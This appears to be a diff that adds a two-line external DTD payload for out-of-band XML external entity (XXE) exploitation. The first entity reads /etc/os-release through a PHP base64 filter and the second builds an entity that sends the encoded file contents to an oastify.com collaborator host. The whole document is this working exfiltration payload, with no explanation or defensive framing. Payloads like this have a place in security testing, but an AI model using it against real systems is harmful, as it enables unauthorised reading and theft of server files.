@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/os-release">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://o3scgu784layvsmuf2fuvt2wzn5et5hu.oastify.com/?%data;'>">
